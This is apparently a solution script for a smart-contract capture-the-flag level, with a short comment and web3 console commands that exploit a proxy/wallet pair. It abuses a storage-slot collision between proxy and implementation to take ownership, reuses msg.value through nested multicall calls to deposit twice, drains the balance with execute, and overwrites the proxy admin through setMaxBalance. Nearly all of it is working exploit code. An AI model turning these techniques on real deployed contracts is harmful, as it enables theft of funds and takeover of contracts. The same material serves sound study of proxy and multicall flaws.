/*
	Key idea is to re-use the msg.value through indirect call to the 'deposit()' function.
	Since the authors have prevented multiple calls to the 'deposit()' function in one 'multicall', we can use 'multicall' to call one or more instance of other 'multicall()' which will call deposit only once.
	This allow to drain the contract balance through the use of the 'execute' function and then to call 'setMaxBalance' which also exploits the convenient slot allocation of both contracts :
		* 'pendingAdmin' in the proxy corresponds to the 'owner' in slot 0
		* 'admin' (our target) in the proxy corresponds to the 'maxBalance' in slot 1
*/
proxy_abi = [{"inputs":[{"internalType":"address","name":"_admin","type":"address"},{"internalType":"address","name":"_implementation","type":"address"},{"internalType":"bytes","name":"_initData","type":"bytes"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pendingAdmin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_newAdmin","type":"address"}],"name":"proposeNewAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"}]
proxy_contract = new web3.eth.Contract(abi, "0x05f2133a8b18ed0706719d2ad88329d9b08e0864")

await proxy_contract.proposeNewAdmin(player).send({"from":player}) // Sets the 'owner' inderctly in the PuzzleWallet contract exploiting the delegatecall storage preservation from the proxy
await contract.addToWhitelist(player) // Since we are the owner we can add ourselves to the whitelist to enable the other functions

depositData = await contract.deposit.request() // First deposit using msg.value
multicallData = await contract.multicall.request([depositData.data]) // Second deposit embedded in a 'multicall' function to bypass the 'one deposit per multicall' restriction 
executeData = await contract.execute.request(player, toWei("0.002"), []) // Sends the contract's funds to our address
transactionData = await contract.multicall.request([depositData.data, multicallData.data, executeData.data]) // Wraps the calls for multicall parameter
await contract.sendTransaction({"from":player, "value":toWei("0.001"), "data":transactionData.data}) // Launch the exploit to drain the funds
await contract.setMaxBalance(web3.utils.encodePacked({"type": "uint256", "value":player})) // Sets the 'maxBalance' corresponding to the 'admin' in proxy contract with our address